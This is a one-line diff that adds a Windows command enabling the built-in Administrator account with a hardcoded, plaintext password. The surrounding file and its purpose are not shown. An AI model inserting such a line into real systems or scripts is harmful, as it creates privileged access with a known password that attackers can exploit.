@@ -1,0 +1,1 @@
+net user administrator /active:yes "_This1sTh3W4y_"
